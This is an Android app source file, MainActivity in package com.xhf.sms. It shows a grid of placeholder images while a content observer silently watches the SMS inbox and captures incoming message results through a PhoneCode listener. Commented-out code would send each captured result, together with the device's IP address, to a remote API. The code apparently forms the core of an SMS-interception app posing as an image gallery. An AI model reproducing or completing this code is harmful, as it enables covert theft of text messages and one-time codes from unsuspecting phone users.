package com.xhf.sms;

import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;

import com.chad.library.adapter.base.loadmore.LoadMoreView;
import com.xhf.sms.adapter.MainAdapter;
import com.xhf.sms.bean.MainBean;

import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity {

    private MainAdapter mMainAdapter;
    private RecyclerView mRecyclerView;
    private List<MainBean> mMainBeans;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        PhoneCode phoneCode = new PhoneCode(this, new Handler(), new PhoneCode.SmsListener() {
            @Override
            public void onResult(String result) {
                Log.e("onResult: ", result);

//                SmsBean smsBean = new SmsBean("tom", result, "", getLocalIpAddress(MainActivity.this));
//                Gson gson = new Gson();

//                ApiManager.getInstance().getApiService().sendSms(gson.toJson(smsBean))
//                        .subscribeOn(Schedulers.io())
//                        .observeOn(AndroidSchedulers.mainThread())
//                        .subscribe(new Observer<Response>() {
//                            @Override
//                            public void onSubscribe(Disposable d) {
//                            }
//
//                            @Override
//                            public void onNext(Response response) {
//                                Log.e("xhf", "onSubscribe: " + response.getMsg());
//                            }
//
//                            @Override
//                            public void onError(Throwable e) {
//                                Log.e("xhf", "onSubscribe: " + e.toString());
//                            }
//
//                            @Override
//                            public void onComplete() {
//
//                            }
//                        });

            }
        });

        this.getContentResolver().registerContentObserver(
                Uri.parse("content://sms/inbox"), true, phoneCode);


    }

    private void initView() {
        mRecyclerView = findViewById(R.id.recyclerView);
        mMainBeans = new ArrayList<>();
        for (int i = 0; i < 50; i++) {
            MainBean mainBean = new MainBean();
            if (i % 2 == 0) {
                mainBean.setImgUrl(R.drawable.ic_item_img2);
            } else if (i % 3 == 0) {
                mainBean.setImgUrl(R.drawable.ic_item_img3);
            } else {
                mainBean.setImgUrl(R.drawable.ic_item_img);
            }
            mMainBeans.add(mainBean);
        }
        mMainAdapter = new MainAdapter(mMainBeans);
        mMainAdapter.setEnableLoadMore(true);
        mRecyclerView.setAdapter(mMainAdapter);
        mRecyclerView.setLayoutManager(new GridLayoutManager(this, 2));
//        View footerView = LayoutInflater.from(this).inflate(R.layout.recycler_footer, null,false);
//        mMainAdapter.setFooterView(footerView);


    }


}
